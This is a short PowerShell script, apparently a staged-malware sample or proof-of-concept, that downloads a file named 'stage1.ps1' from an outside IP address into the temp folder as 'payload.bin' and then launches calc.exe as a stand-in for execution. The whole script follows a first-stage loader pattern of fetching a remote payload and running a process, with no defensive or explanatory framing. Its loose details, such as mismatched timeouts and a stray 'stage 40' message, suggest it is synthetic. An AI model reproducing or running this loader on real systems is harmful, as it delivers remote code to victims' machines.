
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://198.51.100.49/stage1.ps1",
    [string]$LocalPath = "$env:TEMP\payload.bin",
    [int]$RequestTimeout = 33
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Invoke-Stage1Download -SourceUrl $PayloadUrl -DestinationPath $LocalPath -TimeoutSec $RequestTimeout
    if ($StageResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Write-Output "stage 40 initialized"
